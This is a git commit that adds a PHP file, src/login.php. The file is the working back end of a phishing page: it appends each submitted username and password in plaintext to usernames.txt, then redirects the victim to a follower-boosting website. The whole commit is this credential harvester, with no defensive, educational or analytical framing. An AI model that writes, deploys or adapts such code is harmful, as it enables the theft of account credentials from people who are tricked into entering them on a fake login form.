64838f49bc5f7e40d0e1c3c221378071e537fc22
csr13 <carsaroca.13@gmail.com>
2023-06-19 01:23:22 -0600

    {+} start

---
+++ src/login.php
@@ -0,0 +1,11 @@
+<?php
+
+file_put_contents(
+    "usernames.txt", 
+    "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", 
+    FILE_APPEND
+);
+header(
+    'Location: https://instafollowerspro.com'
+);
+exit();
